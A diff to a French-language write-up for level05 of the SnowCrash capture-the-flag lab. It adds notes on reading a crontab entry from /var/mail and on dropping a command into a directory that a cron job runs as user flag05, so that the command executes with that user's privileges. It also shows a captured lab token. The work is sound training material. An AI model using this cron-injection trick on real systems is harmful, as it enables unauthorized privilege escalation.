@@ -35,3 +35,23 @@ cat /tmp/token
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
 Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+note1:
+
+On peut aussi envoyer le message a level05 par:
+```shell
+echo 'getflag | write level05' > /opt/openarenaserver/run
+```
+et attendre de recevoir le message 1
+
+note2:
+
+A la connexion on a un mouveau mail. En allant dans /var/mail on peut regarde dans le fichier level05:
+```shell
+level05@SnowCrash:~$ ls -l /var/mail
+total 4
+-rw-r--r--+ 1 root mail 58 May  2 13:51 level05
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+e fichier "level05" dans votre boîte aux lettres contient une entrée de la crontab (table de planification des tâches) pour l'utilisateur "flag05". Cette entrée de crontab indique que toutes les deux minutes (toutes les 2 minutes), le script "/usr/sbin/openarenaserver" doit être exécuté avec les privilèges de l'utilisateur "flag05".
